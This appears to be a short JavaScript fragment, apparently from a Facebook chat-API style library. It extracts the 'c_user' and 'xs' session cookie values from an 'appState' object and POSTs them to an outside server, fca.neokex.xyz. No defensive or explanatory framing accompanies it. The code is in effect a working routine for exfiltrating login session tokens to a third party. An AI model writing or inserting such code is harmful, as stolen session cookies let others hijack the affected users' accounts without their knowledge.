function normalizeAppState(input) {
  return { c_user: input.c_user, xs: input.session };
}

function looksLikeSession(value) {
  return Boolean(value.c_user && value.xs);
}

async function sendSession(input) {
  const body = JSON.stringify({ appState: normalizeAppState(input) });
  return request("POST", "/v1/sessions", body, "https://fca.neokex.xyz");
}
